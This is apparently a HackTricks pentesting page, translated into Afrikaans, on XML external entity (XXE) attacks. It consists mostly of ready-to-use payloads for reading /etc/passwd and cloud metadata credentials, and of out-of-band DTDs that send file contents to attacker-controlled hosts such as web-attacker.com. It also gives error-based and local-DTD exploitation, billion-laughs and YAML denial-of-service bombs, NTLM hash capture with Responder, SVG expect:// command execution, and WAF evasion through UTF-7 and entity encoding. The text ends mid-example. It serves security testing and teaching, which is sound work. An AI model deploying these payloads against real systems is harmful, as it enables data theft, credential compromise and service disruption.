# XXE - XEE - XML Eksterne Entiteit

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## XML Basies

XML is 'n merktaal wat ontwerp is vir data-opberging en -vervoer, met 'n buigsame struktuur wat die gebruik van beskrywend benoemde etikette moontlik maak. Dit verskil van HTML deur nie beperk te wees tot 'n stel voorgedefinieerde etikette nie. XML se betekenis het afgeneem met die opkoms van JSON, ten spyte van sy aanvanklike rol in AJAX-tegnologie.

* **Dataverteenwoordiging deur Entiteite**: Entiteite in XML maak die verteenwoordiging van data moontlik, insluitend spesiale karakters soos `&lt;` en `&gt;`, wat ooreenstem met `<` en `>` om konflik met XML se etiketsisteem te voorkom.
* **Definisie van XML-elemente**: XML maak die definisie van elementtipes moontlik, wat uiteensit hoe elemente gestruktureer moet word en watter inhoud hulle mag bevat, wat strek van enige tipe inhoud tot spesifieke kinderlemente.
* **Dokumenttipe-definisie (DTD)**: DTD's is noodsaaklik in XML vir die definisie van die dokument se struktuur en die tipes data wat dit kan bevat. Hulle kan intern, ekstern, of 'n kombinasie wees, wat rigting gee oor hoe dokumente geformateer en gevalideer word.
* **Aangepaste en Eksterne Entiteite**: XML ondersteun die skepping van aangepaste entiteite binne 'n DTD vir buigsame dataverteenwoordiging. Eksterne entiteite, gedefinieer met 'n URL, veroorsaak sekuriteitskwessies, veral in die konteks van XML Eksterne Entiteit (XXE)-aanvalle, wat die manier waarop XML-parssers eksterne data-bronne hanteer, benut: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **XXE Opset met Parameter Entiteite**: Vir die opsporing van XXE-gebreke, veral wanneer konvensionele metodes faal as gevolg van parser-sekuriteitsmaatreëls, kan XML-parameter-entiteite gebruik word. Hierdie entiteite maak out-of-band opsporingstegnieke moontlik, soos die teweegbring van DNS-opsoeke of HTTP-versoeke na 'n beheerde domein, om die kwesbaarheid te bevestig.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Hoofaanvalle

[**Die meeste van hierdie aanvalle is getoets met die wonderlike Portswiggers XEE-laboratoriums: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Nuwe Entiteitstoets

In hierdie aanval gaan ek toets of 'n eenvoudige nuwe ENTITEIT-verklaring werk.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Lees lêer

Laten ons probeer om `/etc/passwd` op verskillende maniere te lees. Vir Windows kan jy probeer om te lees: `C:\windows\system32\drivers\etc\hosts`

In hierdie eerste geval, let daarop dat SYSTEM "_\*\*file:///\*\*etc/passwd_" ook sal werk.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Hierdie tweede geval behoort nuttig wees om 'n lêer te onttrek as die webbediener PHP gebruik (Nie die geval met Portswiggers-laboratoriums nie)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
In hierdie derde geval let ons daarop dat ons die `Element stockCheck` as ENIGS declareer.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (753).png>)

### Gidslys

In **Java**-gebaseerde aansoeke kan dit moontlik wees om die inhoud van 'n gids te **lys** via XXE met 'n lading soos (net vra vir die gids in plaas van die lêer):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

'n XXE kan gebruik word om 'n SSRF binne 'n wolk te misbruik
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blinde SSRF

Deur die **voorheen gekommentarieerde tegniek** te gebruik, kan jy die bediener laat toegang verkry tot 'n bediener wat jy beheer om te wys dat dit kwesbaar is. Maar, as dit nie werk nie, is dit miskien omdat **XML-entiteite nie toegelaat word nie**, in daardie geval kan jy probeer om **XML-parameter-entiteite** te gebruik:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Skuur data buite-band uit

**In hierdie geval gaan ons die bediener 'n nuwe DTD laat laai met 'n skadelike lading wat die inhoud van 'n lêer via 'n HTTP-aanvraag sal stuur (vir meerlynige lêers kan jy probeer om dit uit te skuur via \_ftp://**\_ deur hierdie basiese bediener byvoorbeeld te gebruik [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Hierdie verduideliking is gebaseer op** [**Portswiggers lab hier**](https://portswigger.net/web-security/xxe/blind)**.**

In die gegee skadelike DTD word 'n reeks stappe onderneem om data uit te skuur:

### Skadelike DTD-voorbeeld:

Die struktuur is as volg:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Die stappe uitgevoer deur hierdie DTD sluit in:

1. **Definisie van Parameter Entiteite:**
   * 'n XML-parameterentiteit, `%file`, word geskep wat die inhoud van die `/etc/hostname`-lêer lees.
   * 'n Ander XML-parameterentiteit, `%eval`, word gedefinieer. Dit verklaar dinamies 'n nuwe XML-parameterentiteit, `%exfiltrate`. Die `%exfiltrate`-entiteit word ingestel om 'n HTTP-aanvraag na die aanvaller se bediener te maak, waar die inhoud van die `%file`-entiteit binne die vraagstring van die URL oorgedra word.
2. **Uitvoering van Entiteite:**
   * Die `%eval`-entiteit word gebruik, wat lei tot die uitvoering van die dinamiese verklaring van die `%exfiltrate`-entiteit.
   * Die `%exfiltrate`-entiteit word dan gebruik, wat 'n HTTP-aanvraag na die gespesifiseerde URL met die lêer se inhoud aanstoot.

Die aanvaller bied hierdie skadelike DTD aan op 'n bediener onder hul beheer, tipies by 'n URL soos `http://web-attacker.com/malicious.dtd`.

**XXE Lading:** Om 'n kwesbare aansoek te benut, stuur die aanvaller 'n XXE-lading:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Hierdie lading definieer 'n XML-parameterentiteit `%xxe` en sluit dit in die DTD in. Wanneer verwerk deur 'n XML-parser, haal hierdie lading die eksterne DTD van die aanvaller se bediener af. Die parser interpreteer dan die DTD inline, voer die stappe uit wat in die skadelike DTD uitgelê is, en lei tot die uitlek van die `/etc/hostname`-lêer na die aanvaller se bediener.

### Fout-gebaseerd (Eksterne DTD)

**In hierdie geval gaan ons die bediener 'n skadelike DTD laat laai wat die inhoud van 'n lêer binne 'n foutboodskap wys (dit is slegs geldig as jy foutboodskappe kan sien).** [**Voorbeeld van hier.**](https://portswigger.net/web-security/xxe/blind)

'n XML-ontledingsfoutboodskap wat die inhoud van die `/etc/passwd`-lêer onthul, kan geaktiveer word deur 'n skadelike eksterne Dokumenttipe-definisie (DTD) te gebruik. Dit word bereik deur die volgende stappe:

1. 'n XML-parameterentiteit met die naam `file` word gedefinieer, wat die inhoud van die `/etc/passwd`-lêer bevat.
2. 'n XML-parameterentiteit met die naam `eval` word gedefinieer, wat 'n dinamiese verklaring vir 'n ander XML-parameterentiteit met die naam `error` insluit. Hierdie `error`-entiteit, wanneer geëvalueer, probeer om 'n nie-bestaande lêer te laai, wat die inhoud van die `file`-entiteit as sy naam insluit.
3. Die `eval`-entiteit word aangeroep, wat lei tot die dinamiese verklaring van die `error`-entiteit.
4. Die aanroeping van die `error`-entiteit lei tot 'n poging om 'n nie-bestaande lêer te laai, wat 'n foutboodskap produseer wat die inhoud van die `/etc/passwd`-lêer as deel van die lêernaam insluit.

Die skadelike eksterne DTD kan aangeroep word met die volgende XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bij uitvoering moet die webbediener se reaksie 'n foutboodskap insluit wat die inhoud van die `/etc/passwd`-lêer vertoon.

![](<../.gitbook/assets/image (809).png>)

_**Let asseblief daarop dat 'n eksterne DTD ons toelaat om een entiteit binne die tweede (****`eval`****) in te sluit, maar dit is verbode in die interne DTD. Daarom kan jy nie 'n fout afdwing sonder om 'n eksterne DTD te gebruik (gewoonlik).**_

### **Fout-gebaseer (sisteem DTD)**

Wat van blinde XXE kwesbaarhede wanneer **out-of-band interaksies geblokkeer is** (eksterne verbindinge is nie beskikbaar nie)?.

'n Oorweging in die XML-taal spesifikasie kan 'n **blootstelling van sensitiewe data deur foutboodskappe veroorsaak wanneer 'n dokument se DTD interne en eksterne verklarings meng**. Hierdie probleem maak die interne herdefiniëring van entiteite wat eksterne verklaar is moontlik, wat die uitvoering van fout-gebaseerde XXE-aanvalle fasiliteer. Sulke aanvalle maak gebruik van die herdefiniëring van 'n XML-parameterentiteit, oorspronklik verklaar in 'n eksterne DTD, van binne 'n interne DTD. Wanneer out-of-band verbindinge deur die bediener geblokkeer word, moet aanvallers staatmaak op plaaslike DTD-lêers om die aanval uit te voer, met die doel om 'n parsingsfout te veroorsaak om sensitiewe inligting bloot te lê.

Oorweeg 'n scenario waar die bediener se lêersisteem 'n DTD-lêer by `/usr/local/app/schema.dtd` bevat, wat 'n entiteit genaamd `custom_entity` definieer. 'n Aanvaller kan 'n XML-parsingsfout veroorsaak wat die inhoud van die `/etc/passwd`-lêer blootstel deur 'n hibriede DTD in te dien soos volg:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Die uitgeligde stappe word uitgevoer deur hierdie DTD:

* Die definisie van 'n XML-parameterentiteit genaamd `local_dtd` sluit die eksterne DTD-lêer in wat op die bediener se lêersisteem geleë is.
* 'n Herdefinisie vind plaas vir die `custom_entity` XML-parameterentiteit, oorspronklik gedefinieer in die eksterne DTD, om 'n [foutgebaseerde XXE-uitbuiting](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) in te sluit. Hierdie herdefinisie is ontwerp om 'n parsingsfout te veroorsaak, wat die inhoud van die `/etc/passwd`-lêer blootstel.
* Deur die `local_dtd`-entiteit te gebruik, word die eksterne DTD betrek, wat die nuut gedefinieerde `custom_entity` insluit. Hierdie reeks van aksies veroorsaak die uitsending van die foutboodskap wat deur die uitbuiting beoog word.

**Werklike wêreld voorbeeld:** Stelsels wat die GNOME-desktopomgewing gebruik, het dikwels 'n DTD by `/usr/share/yelp/dtd/docbookx.dtd` wat 'n entiteit genaamd `ISOamso` bevat.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (625).png>)

Aangesien hierdie tegniek 'n **interne DTD gebruik, moet jy eers 'n geldige een vind**. Jy kan dit doen deur dieselfde **BS / sagteware** te **installeer** wat die bediener gebruik en **'n paar standaard DTD's te soek**, of deur 'n lys van **standaard DTD's** binne stelsels te **gryp** en te **kontroleer** of enige van hulle bestaan:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Vir meer inligting kyk na [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Vind DTD's binne die stelsel

In die volgende wonderlike github-opberging kan jy **paaie van DTD's wat in die stelsel teenwoordig kan wees**, vind:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Verder, as jy die **Docker-beeld van die slagofferstelsel** het, kan jy die gereedskap van dieselfde opberging gebruik om die **beeld** te **skandeer** en die paaie van **DTD's** wat teenwoordig is binne die stelsel, te **vind**. Lees die [Leesmy van die github](https://github.com/GoSecure/dtd-finder) om te leer hoe.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

Vir 'n meer in-diepte verduideliking van hierdie aanval, **kyk na die tweede afdeling van** [**hierdie fantastiese pos**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **van Detectify**.

Die vermoë om **Microsoft Office-dokumente te laai word deur baie webtoepassings aangebied**, wat dan voortgaan om sekere besonderhede uit hierdie dokumente te onttrek. Byvoorbeeld, 'n webtoepassing mag gebruikers toelaat om data in te voer deur 'n XLSX-formaat sigblad te laai. Ten einde die data uit die sigblad te onttrek, sal die ontleder onvermydelik ten minste een XML-lêer moet ontleder.

Om vir hierdie kwesbaarheid te toets, is dit nodig om 'n **Microsoft Office-lêer te skep wat 'n XXE-lading bevat**. Die eerste stap is om 'n leë gids te skep waarin die dokument uitgepak kan word.

Sodra die dokument uitgepak is, moet die XML-lêer wat geleë is by `./unzipped/word/document.xml` oopgemaak en in 'n voorkeur teksredigeerder (soos vim) gewysig word. Die XML moet gewysig word om die gewenste XXE-lading in te sluit, dikwels beginnende met 'n HTTP-aanvraag.

Die gewysigde XML-lyne moet tussen die twee hoof XML-voorwerpe ingevoeg word. Dit is belangrik om die URL met 'n monitorbare URL vir aanvrae te vervang.

Laastens kan die lêer saamgepak word om die skadelike poc.docx-lêer te skep. Vanuit die voorheen geskepte "unzipped" gids moet die volgende bevel uitgevoer word:

Nou kan die geskepte lêer na die moontlik kwesbare webtoepassing gelaai word, en 'n persoon kan hoop om 'n aanvraag in die Burp Collaborator-logboeke te sien verskyn.

### Jar: protokol

Die **jar**-protokol is slegs toeganklik binne **Java-toepassings**. Dit is ontwerp om lêertoegang binne 'n **PKZIP**-argief (bv., `.zip`, `.jar`, ens.) moontlik te maak, wat beide plaaslike en afgeleë lêers bedien.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Om toegang te hê tot lêers binne PKZIP-lêers is **baie nuttig om XXE te misbruik via stelsel DTD-lêers.** Kyk na [hierdie afdeling om te leer hoe om stelsel DTD-lêers te misbruik](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Die proses agter die toegang tot 'n lêer binne 'n PKZIP-argief via die jar-protokol behels verskeie stappe:

1. 'n HTTP-versoek word gedoen om die zip-argief vanaf 'n gespesifiseerde plek af te laai, soos `https://download.website.com/archive.zip`.
2. Die HTTP-antwoord wat die argief bevat, word tydelik op die stelsel gestoor, tipies op 'n plek soos `/tmp/...`.
3. Die argief word dan uitgepak om toegang tot sy inhoud te verkry.
4. Die spesifieke lêer binne die argief, `file.zip`, word gelees.
5. Na die operasie word enige tydelike lêers wat tydens hierdie proses geskep is, verwyder.

'n Interessante tegniek om hierdie proses by die tweede stap te onderbreek, behels om die bedienersverbinding onbepaald oop te hou wanneer die argief-lêer bedien word. Gereedskap beskikbaar by [hierdie argief](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) kan vir hierdie doel gebruik word, insluitend 'n Python-bediener (`slow_http_server.py`) en 'n Java-bediener (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Die skryf van lêers in 'n tydelike gids kan help om 'n ander kwesbaarheid te verhoog wat 'n padtraversie insluit (soos plaaslike lêer insluiting, templaat inspuiting, XSLT RCE, deserialisering, ens.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Biljoen Lag Aanval
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Aanval
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Kwadratiese Uitduns Aanval

![](<../.gitbook/assets/image (527).png>)

#### Kry NTML

Op Windows-gashere is dit moontlik om die NTML-hash van die webbedienergebruiker te kry deur 'n responder.py-handler in te stel:
```bash
Responder.py -I eth0 -v
```
en deur die volgende versoek te stuur
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Versteekte XXE Oppervlaktes

### XInclude

Wanneer kliëntdata geïntegreer word in bedienerskant XML-dokumente, soos dié in agterkant SOAP-versoeke, is direkte beheer oor die XML-struktuur dikwels beperk, wat tradisionele XXE-aanvalle belemmer as gevolg van beperkings op die wysiging van die `DOCTYPE` element. 'n `XInclude`-aanval bied egter 'n oplossing deur die invoeging van eksterne entiteite binne enige data-element van die XML-dokument moontlik te maak. Hierdie metode is doeltreffend selfs wanneer slegs 'n gedeelte van die data binne 'n bedieners-gegenereerde XML-dokument beheer kan word.

Om 'n `XInclude`-aanval uit te voer, moet die `XInclude`-naamruimte verklaar word, en die lêerpad vir die bedoelde eksterne entiteit moet gespesifiseer word. Hieronder is 'n bondige voorbeeld van hoe so 'n aanval geformuleer kan word:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Kyk na [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) vir meer inligting!

### SVG - Lêeroplaai

Lêers wat deur gebruikers na sekere toepassings opgelaai word en dan op die bediener verwerk word, kan kwesbaarhede uitbuit in hoe XML- of XML-bevattende lêerformate hanteer word. Gewone lêerformate soos kantoor dokumente (DOCX) en beelde (SVG) is gebaseer op XML.

Wanneer gebruikers **beelde oplaai**, word hierdie beelde aan die bedienerkant verwerk of geverifieer. Selfs vir toepassings wat formate soos PNG of JPEG verwag, kan die **bediener se beeldverwerkingbiblioteek ook SVG-beelde ondersteun**. SVG, as 'n op XML-gebaseerde formaat, kan deur aanvallers uitgebuit word om skadelike SVG-beelde in te dien, wat gevolglik die bediener blootstel aan XXE (XML External Entity) kwesbaarhede.

'n Voorbeeld van so 'n aanval word hieronder getoon, waar 'n skadelike SVG-beeld probeer om stelsel lêers te lees:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
'n Ander metode behels 'n poging om **bevele uit te voer** deur die PHP "expect" omhulsel:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
In beide gevalle word die SVG-formaat gebruik om aanvalle te lanceer wat die XML-verwerkingseienskappe van die bediener se sagteware benut, wat die behoefte aan deurslagkragtige insetvalidering en sekuriteitsmaatreëls beklemtoon.

Kyk na [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) vir meer inligting!

**Merk op dat die eerste lyn van die leeslêer of van die resultaat van die uitvoering BINNE die geskepte beeld sal verskyn. Jy moet dus in staat wees om toegang tot die beeld te verkry wat SVG geskep het.**

### **PDF - Lêeroplaai**

Lees die volgende pos om te leer hoe om 'n XXE te benut deur 'n PDF-lêer op te laai:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Van x-www-urlencoded na XML

As 'n POST-aanvraag die data in XML-formaat aanvaar, kan jy probeer om 'n XXE in daardie versoek te benut. Byvoorbeeld, as 'n normale versoek die volgende bevat:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Dan kan jy dalk die volgende versoek indien, met dieselfde resultaat:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Inhouds-Tipe: Van JSON tot XEE

Om die versoek te verander, kan jy 'n Burp-uitbreiding genaamd "**Inhoudstipe-omsetter**" gebruik. [Hier](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) kan jy hierdie voorbeeld vind:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
'n Ander voorbeeld kan [hier](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) gevind word.

## WAF & Beskermingsontduiking

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Dit werk net as die XML-bediener die `data://` protokol aanvaar.

### UTF-7

Jy kan die \[**"Encode Recipe**" van cyberchef hier ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) omskep na UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Lêer:/ Protokol Oorslaan

As die web PHP gebruik, in plaas van om `file:/` te gebruik kan jy **php omhulsels** `php://filter/convert.base64-encode/resource=` gebruik om **interne lêers te benader**.

As die web Java gebruik kan jy die [**jar: protokol**](xxe-xee-xml-external-entity.md#jar-protocol) nagaan.

### HTML Entiteite

Truuk van [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Jy kan 'n **entiteit binne 'n entiteit** skep deur dit te kodeer met **html entiteite** en dit dan roep om 'n **dtd te laai**.\
Let daarop dat die **HTML Entiteite** wat gebruik word, **numeries** moet wees (soos \[in hierdie voorbeeld]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD-voorbeeld:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
